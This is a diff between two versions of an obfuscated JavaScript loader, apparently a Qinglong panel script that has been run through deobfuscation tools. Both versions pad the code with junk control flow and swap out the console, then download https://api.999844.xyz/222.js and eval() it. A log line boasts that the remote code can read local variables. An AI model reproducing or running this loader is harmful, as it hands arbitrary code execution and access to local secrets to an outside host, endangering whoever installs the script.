@@ -1,372 +1,294 @@
-//Tue Dec 30 2025 05:13:54 GMT+0000 (Coordinated Universal Time)
+//Tue Dec 30 2025 05:15:29 GMT+0000 (Coordinated Universal Time)
 //Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
 //Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
-function FKXFrV(_0x13c124, _0x3e319f) {
+try {
+  var _0x98ecd3 = 16;
+  _0x98ecd3 = 15;
+  var _0x1756d5 = 4;
+  var _0x4b5753 = {};
+  _0x1756d5 = 0;
+  var _0x3b5375 = 13;
+  var _0x4cf34f = {};
+  _0x3b5375 = 10;
+  var _0x36bafd;
+  _0x36bafd = 11;
+  var _0x2e3a7c = 7;
+  _0x2e3a7c = 9;
+  if (typeof $MJ == "string") {
+    try {
+      try {
+        $XcJ8 = undefined;
+      } catch (_0xf97c0e) {}
+    } catch (_0xc24b8a) {}
+  }
+  if (_PvOd == [] && $ujNfvcvYP != false) {
+    try {
+      try {
+        _kN = null;
+      } catch (_0x49e99c) {}
+    } catch (_0x225780) {}
+  }
+} catch (_0xa4d7f) {}
+function QxIDOq(_0x5654ee, _0x351363) {
   return;
-  FKXFrV = function (_0x18c9bb, _0x34df39) {
-    _0x18c9bb = _0x18c9bb - 0;
-    var _0x5a3fd9 = _0x5e50e6[_0x18c9bb];
-    return _0x5a3fd9;
+  QxIDOq = function (_0x5a9b1d, _0x2877f7) {
+    _0x5a9b1d = _0x5a9b1d - 0;
+    var _0xbe0c48 = _0x5e50e6[_0x5a9b1d];
+    return _0xbe0c48;
   };
-  return FKXFrV(_0x13c124, _0x3e319f);
+  return QxIDOq(_0x5654ee, _0x351363);
 }
-FKXFrV();
-try {
-  var _0x2206d4;
-  _0x2206d4 = "npdllq";
-  for (; $gnd < 5; _VmKNKkbdQ++) {
-    try {
-      console.log("rkyz");
-    } catch (_0x11c7fe) {
-      break;
-    }
-  }
-  if (typeof $EMncqYyPp == "string") {
-    try {
-      try {
-        Object.keys($wfMDZ4).forEach(function (_0x4942fd) {
-          console.log(_0x4942fd);
-        });
-      } catch (_0x4053c5) {}
-    } catch (_0x3a3b16) {}
-  }
-} catch (_0x5038e7) {}
-const _0x2aee80 = require("https");
-try {
-  var _0x20384f = undefined;
-  function _0x9d7886(_0x16fd15, _0x4a17b8) {
-    try {
-      console.log({});
-    } catch (_0x8539cc) {
-      return null;
-    }
-  }
-  function _0x412e44(_0x195730, _0xaa06) {
-    try {
-      try {
-        $VnBZwn = JSON.parse("}{".split("").reverse().join(""));
-      } catch (_0x22b375) {}
-    } catch (_0x5e383c) {
-      return null;
-    }
-  }
-  if ($ySdHerf9 == {} || _ffTmi != true) {
-    try {
-      for (; $kSjulY6 < 5; $OjMVcbw++) {
-        try {
-          console.log(_vaiVb);
-        } catch (_0x8b33db) {}
-      }
-    } catch (_0x22c2ad) {}
-  }
-  for (; $dEykeoDPm < 5; $VPqABg++) {
-    try {
-      console.log({});
-    } catch (_0x3c2e70) {
-      break;
-    }
-  }
-  if (_BS > {}) {
-    try {
-      for (; $LjICLe < 5; $VO++) {
-        try {
-          console.log($eUkyHPj8);
-        } catch (_0x4f9ae6) {}
-      }
-    } catch (_0x5c221f) {}
-  }
-  for (; $IPVIgsA < 5; _esB6++) {
-    try {
-      var _0x3ca74f = {};
-    } catch (_0x31fece) {
-      break;
-    }
-  }
+QxIDOq();
+const _0x1fc9af = require("https");
+(function (_0x1a42a5) {
   try {
-    while (_yCIbP == 194 && $XcIWHyV != "bsdu") {
-      console.log(909);
-    }
-  } catch (_0x3a69ba) {}
-  if ($nzrEBX2 == null && $VSNjk7 != {}) {
-    try {
-      try {
-        Object.keys($JJ).forEach(function (_0x3dfb73) {
-          console.log(_0x3dfb73);
-        });
-      } catch (_0x1d4d20) {}
-    } catch (_0x1cf493) {}
-  }
-  if (typeof _HFaVPIyg == "string") {
-    try {
-      if ($EXK >= {}) {
+    {
+      var _0x94a3b7 = undefined;
+      var _0x3d4a32 = 10;
+      var _0x2d9c37 = undefined;
+      _0x3d4a32 = 8;
+      var _0x208507 = undefined;
+      var _0x4cb9e8 = 5;
+      _0x4cb9e8 = 15;
+      function _0x4485f4(_0x27f1ee, _0x64be37) {
         try {
-          $lw++;
-        } catch (_0x315820) {}
+          try {
+            {
+              $cWFUhNEPQ = 178;
+            }
+          } catch (_0x184508) {}
+        } catch (_0x64675a) {
+          {
+            return null;
+          }
+        }
       }
-    } catch (_0x1710a6) {}
-  }
-  for (; _YmEMJE < 5; $su++) {
-    try {
       try {
-        $RxwpTz0 = false;
-      } catch (_0x4e53de) {}
-    } catch (_0x1d15df) {
-      break;
+        {
+          while ($LvMfiOgn != {}) {
+            for (var _0x2d5a23 = 0; $lXclaliy5 < 5; _GCeFpYg6++) {
+              try {
+                console.log($fTTeNJM3);
+              } catch (_0x2d7a5d) {}
+            }
+          }
+        }
+      } catch (_0x165715) {}
+      for (; _VmB < 5; $RD++) {
+        {
+          try {
+            if (typeof _ABy == "string") {
+              try {
+                _oMks++;
+              } catch (_0x25c81a) {}
+            }
+          } catch (_0x572c50) {
+            break;
+          }
+        }
+      }
+      for (; _Ug < 5; _gUldpMoCK++) {
+        {
+          try {
+            try {
+              _enTuSPKJ4 = JSON.parse("}{".split("").reverse().join(""));
+            } catch (_0x12b2d1) {}
+          } catch (_0x351c9a) {
+            {
+              break;
+            }
+          }
+        }
+      }
     }
-  }
-} catch (_0x12d13c) {}
+  } catch (_0x54f598) {}
+  return 464;
+})(null, []);
 const {
-  Console: _0x58180e
+  Console: _0x3b89a6
 } = require("console");
 global.LOCAL_CONFIG = {
   username: "青龙用户",
   localPath: "/ql/scripts",
   timeout: 30000
 };
-(function (_0x569787, _0x2e0897) {
+try {
+  var _0x8e293d = undefined;
+  var _0x489744 = 10;
+  _0x489744 = "bkopdj";
+  var _0x302185 = undefined;
+  var _0x4d05ff = 1;
+  _0x4d05ff = 16;
+  function _0x49ce5e(_0x3cee8d, _0xa9c45) {
+    try {
+      _bPV = {};
+    } catch (_0x4fc6c8) {
+      return null;
+    }
+  }
   try {
-    function _0x432360(_0x2b4103) {
-      try {
-        try {
-          Object.keys($FcSh).forEach(function (_0x487938) {
-            console.log(_0x487938);
-          });
-        } catch (_0x1b1482) {}
-      } catch (_0x40ddbd) {
-        return null;
-      }
+    while (_HTsVtJKhS == 772 && $hpNMArkwT != []) {
+      _LfsEV = null;
     }
-    function _0x4f811f() {
-      try {
-        try {
-          Object.keys($FvgCWGbnw).forEach(function (_0x113d79) {
-            console.log(_0x113d79);
-          });
-        } catch (_0x96f9fa) {}
-      } catch (_0x38b6dd) {
-        return null;
-      }
-    }
-    function _0x1ac072() {
-      try {
-        for (; _fLEYACzXJ < 5; _hfntBr++) {
-          try {
-            console.log(_eyBlXwEsP4);
-          } catch (_0x37f979) {}
-        }
-      } catch (_0x4ce2c3) {
-        return null;
-      }
-    }
+  } catch (_0x1ffce5) {}
+  if (_azd == null) {
     try {
-      while ($ZGcCWT == "h86u") {
-        for (var _0x242536 = 0; _kyytNRDR < 5; $xuGyzyJ++) {
-          try {
-            console.log($AXvj);
-          } catch (_0x137716) {}
-        }
-      }
-    } catch (_0x2f4ee3) {}
-    for (; _ZJS < 5; $AoVex++) {
-      try {
+      if (typeof $zQ == "string") {
         try {
-          Object.keys(_VYxIazSh).forEach(function (_0x144884) {
-            console.log(_0x144884);
-          });
-        } catch (_0x3de339) {}
-      } catch (_0x4d6c05) {
-        break;
+          _rmqLY++;
+        } catch (_0x460da5) {}
       }
+    } catch (_0x79cff4) {}
+  }
+  try {
+    while ($mGIL < null) {
+      console.log(999);
     }
+  } catch (_0x580b97) {}
+  if (typeof _LWthI == "string") {
     try {
-      while (_QiYtBGdnb0 >= 942) {
-        console.log(null);
-      }
-    } catch (_0x25ec29) {}
-    if ($iC <= []) {
       try {
-        try {
-          $tlEjXrwLb = JSON.parse("{}");
-        } catch (_0x35793c) {}
-      } catch (_0x1ce315) {}
-    }
-    for (; _SZGbJia < 5; $rIZeHP++) {
-      try {
-        console.log(false);
-      } catch (_0x57091a) {
-        break;
-      }
-    }
-    if (typeof $FSK == "string") {
-      try {
-        for (; _YwE < 5; _jv++) {
-          try {
-            console.log($jNtsJkB);
-          } catch (_0x196e09) {}
-        }
-      } catch (_0x36fdc3) {}
-    }
-    if ($DBdfIz == "cxn4" && _JpbMPlHY != []) {
-      try {
-        console.log(537);
-      } catch (_0x3c8d0b) {}
-    }
+        Object.keys(_GwzsLijf).forEach(function (_0xaaa65d) {
+          console.log(_0xaaa65d);
+        });
+      } catch (_0x2f747b) {}
+    } catch (_0x57f439) {}
+  }
+  for (; $xjUeWnd < 5; _RzWaXOrok++) {
     try {
-      while ($DXKLpSigw >= true) {
+      for (var _0x2d7167 = 0; _wJEkEx < 5; _VQrVlXK++) {
         try {
-          $GSjSwDLSn = JSON.parse("}{".split("").reverse().join(""));
-        } catch (_0x31ecca) {}
+          console.log(_nwcHegH);
+        } catch (_0x28e850) {}
       }
-    } catch (_0x13e65e) {}
-  } catch (_0x5c18e7) {}
-  return [];
-})();
-function QqZZUC(_0x49e20a, _0x426a6f) {
-  return;
-  QqZZUC = function (_0x1dbf88, _0x45c9a2) {
-    _0x1dbf88 = _0x1dbf88 - 0;
-    var _0x5640c0 = _0x5e50e6[_0x1dbf88];
-    return _0x5640c0;
-  };
-  return QqZZUC(_0x49e20a, _0x426a6f);
-}
-QqZZUC();
-var _0x4411b0 = 3;
-const _0x10e015 = new _0x58180e({
+    } catch (_0x4a667d) {
+      break;
+    }
+  }
+  for (; _ZD < 5; _bStbpDtN4++) {
+    try {
+      for (var _0x4afaee = 0; _XOLWg < 5; $mZy++) {
+        try {
+          console.log($BFxc6);
+        } catch (_0x1efac3) {}
+      }
+    } catch (_0x5c35e1) {
+      break;
+    }
+  }
+} catch (_0x5b6930) {}
+const _0x3da765 = new _0x3b89a6({
   stdout: process.stdout,
   stderr: process.stderr
 });
-_0x4411b0 = 0;
-(function () {
+function EYDpzu(_0x4d6a23, _0x58e677) {
+  return;
+  EYDpzu = function (_0x343d10, _0x272514) {
+    _0x343d10 = _0x343d10 - 0;
+    var _0x4da416 = _0x5e50e6[_0x343d10];
+    return _0x4da416;
+  };
+  return EYDpzu(_0x4d6a23, _0x58e677);
+}
+EYDpzu();
+try {
+  function _0x6922ba() {
+    try {
+      {
+        try {
+          _lbNcVHLhm = "9nfp";
+        } catch (_0x564c10) {}
+      }
+    } catch (_0x35531c) {
+      return null;
+    }
+  }
+} catch (_0x447536) {}
+var _0x97c5df;
+const _0x1ff0dc = console;
+_0x97c5df = 3;
+global.console = _0x3da765;
+var _0x136cca = 15;
+const _0x4bff5e = "https://api.999844.xyz/222.js";
+_0x136cca = "ochmnk";
+_0x1fc9af.get(_0x4bff5e, _0xe7208f => {
   try {
-    var _0x57b908 = 7;
-    _0x57b908 = 4;
-    var _0x38df58 = 12;
-    _0x38df58 = 8;
-    var _0x490907;
-    _0x490907 = 8;
-    function _0x9dffa5(_0x33027f) {
-      try {
-        console.log(undefined);
-      } catch (_0x3a3645) {
-        return null;
-      }
-    }
-    if (_gFhqy == true) {
+    var _0x3a71e0 = {};
+    var _0x3ce4d1;
+    _0x3ce4d1 = "fggnbl";
+    if ($OPxzgZ != "bqen") {
       try {
         try {
-          Object.keys(_RPposxXU).forEach(function (_0x285759) {
-            console.log(_0x285759);
+          _fdJONWZt = undefined;
+        } catch (_0xd7276b) {}
+      } catch (_0x4af6a2) {}
+    }
+    if (typeof _vzDP == "string") {
+      try {
+        var _0x5df927;
+        _0x5df927 = "cadeib";
+      } catch (_0x283f4f) {}
+    }
+    try {
+      while ($WlFQDwQP4 < []) {
+        try {
+          Object.keys(_RvmYxIDt).forEach(function (_0x106eda) {
+            console.log(_0x106eda);
           });
-        } catch (_0x2745fe) {}
-      } catch (_0x5a6d2f) {}
-    }
-    if (typeof $al == "string") {
-      try {} catch (_0x40bcd2) {}
-    }
+        } catch (_0x1426fe) {}
+      }
+    } catch (_0x5d83fa) {}
     try {
-      while (typeof $uVLP == "string") {
-        for (var _0xfc4b11 = 0; _dlUaCLtj5 < 5; _uzLBpA++) {
-          try {
-            console.log(_RPL);
-          } catch (_0x2cb7b8) {}
+      while (typeof $LQwbUF4 == "string") {
+        {
+          _TpRbhqXj = [];
         }
       }
-    } catch (_0x474644) {}
-    if (_oLhWcp == 673 && $pkigJhnGH != false) {
-      try {
-        _TS = false;
-      } catch (_0x31b1a6) {}
-    }
-    for (; $ndHR < 5; _kWLqij++) {
-      try {
-        for (var _0x3e5a62 = 0; _EfbA < 5; _RyjrOZ++) {
-          try {
-            console.log(_hNNChyTyP);
-          } catch (_0x421460) {}
-        }
-      } catch (_0xdf4957) {
-        break;
-      }
-    }
-    if (typeof _flOAupjh == "string") {
-      try {
-        try {
-          _mXd5 = 353;
-        } catch (_0x5ef303) {}
-      } catch (_0x47ce5d) {}
-    }
-  } catch (_0x25edb7) {}
-  return [];
-})(null);
-const _0x490d3f = console;
-global.console = _0x10e015;
-var _0x4e06b7 = 8;
-const _0xac704c = "https://api.999844.xyz/222.js";
-_0x4e06b7 = "khaegp";
-_0x2aee80.get(_0xac704c, _0x28a6c5 => {
-  (function () {
+    } catch (_0xd5b45a) {}
     try {
-      var _0x493477;
-      _0x493477 = 6;
-      var _0x1ca3d6 = 9;
-      _0x1ca3d6 = 10;
-      var _0x2d5600 = 13;
-      _0x2d5600 = 4;
-      function _0x196405(_0x4f388e) {
-        try {
-          for (; _koqmhRZxx3 < 5; _CCybST++) {
-            try {
-              console.log($tQUHL6);
-            } catch (_0x4b322f) {}
-          }
-        } catch (_0x41d4d1) {
-          return null;
-        }
-      }
-      function _0x58aabb(_0x5b4cbb, _0xc3607e) {
-        try {
-          var _0xe9605a = 12;
-          _0xe9605a = 7;
-        } catch (_0x28f63c) {
-          return null;
-        }
-      }
-      function _0x2c0f8e() {
-        try {
-          console.log(undefined);
-        } catch (_0x4a4119) {
-          return null;
-        }
-      }
-      for (; $WnBu < 5; $twF++) {
-        try {
+      {
+        while (typeof $VcvzVPL == "string") {
           try {
-            Object.keys(_iDRRA).forEach(function (_0x1e926d) {
-              console.log(_0x1e926d);
-            });
-          } catch (_0x13773c) {}
-        } catch (_0x2cb12a) {
-          break;
+            {
+              _qIEDsP = JSON.parse("{}");
+            }
+          } catch (_0x1f865d) {}
         }
       }
-    } catch (_0x500618) {}
-    return {};
-  })();
-  var _0x385156;
-  let _0x37c41d = "";
-  _0x385156 = 2;
-  _0x28a6c5.on("data", _0x495504 => _0x37c41d += _0x495504.toString());
-  _0x28a6c5.on("end", () => {
+    } catch (_0x324d8c) {}
     try {
-      console.log("远程脚本开始执行（可读取本地变量）...");
-      eval(_0x37c41d);
-    } catch (_0x3a0340) {
-      console.error("[远程脚本错误]", _0x3a0340.message);
+      while ($WuIx0 == null) {
+        for (var _0x331214 = 0; $KfnNLlOh < 5; $bqVZXJR++) {
+          try {
+            {
+              console.log($Xs);
+            }
+          } catch (_0x2df173) {}
+        }
+      }
+    } catch (_0x5bab53) {}
+    if (typeof _nM9 == "string") {
+      {
+        try {
+          _tWMMUU = "ctcf";
+        } catch (_0x15bfe2) {}
+      }
+    }
+  } catch (_0x2ca926) {}
+  let _0x10a69b = "";
+  _0xe7208f.on("data", _0x4ada01 => _0x10a69b += _0x4ada01.toString());
+  _0xe7208f.on("end", () => {
+    try {
+      {
+        console.log("远程脚本开始执行（可读取本地变量）...");
+        eval(_0x10a69b);
+      }
+    } catch (_0x349ba1) {
+      console.error("[远程脚本错误]", _0x349ba1.message);
     } finally {
-      global.console = _0x490d3f;
+      global.console = _0x1ff0dc;
     }
   });
-}).on("error", _0x5d0427 => {
-  _0x490d3f.error("[本地访问失败]", _0x5d0427.message);
+}).on("error", _0x4b6017 => {
+  _0x1ff0dc.error("[本地访问失败]", _0x4b6017.message);
 });
